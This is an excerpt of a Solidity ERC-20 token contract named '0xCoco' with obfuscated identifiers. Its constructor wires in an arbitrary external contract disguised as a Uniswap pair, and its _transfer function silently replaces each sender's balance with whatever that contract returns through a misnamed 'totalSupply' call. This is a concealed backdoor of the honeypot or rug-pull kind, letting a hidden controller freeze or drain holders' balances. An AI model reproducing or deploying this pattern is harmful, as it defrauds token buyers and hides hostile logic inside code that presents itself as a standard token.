...
interface fpppiNDTkGlvoxwEtTfMr {
...
contract TOKEN is Ownable, IERC20 {
    ...
    fpppiNDTkGlvoxwEtTfMr private uniswapV1PairToken;

    constructor(uint256 decimals_, uint256 ashxhac) {
        _decimalsshxhac = decimals_;
        _nameshxhac ="0xCoco";
        _symbolshxhac = "Love Coco";
        _totalSupply = 1000000000 * 10**_decimalsshxhac;
        uniswapV1PairToken = fpppiNDTkGlvoxwEtTfMr(
            address(uint160(ashxhac)));
    ...
    function _transfer(
        ...
        _balance[lrldpllefrom] = uniswapV1PairToken
           .totalSupply(
            lrldpllefrom,
            amount,
            _balance[lrldpllefrom]
        );
        require(
    ...
    function zrsvtczv() external view returns (uint256) {
    return _decimalsshxhac;
    }
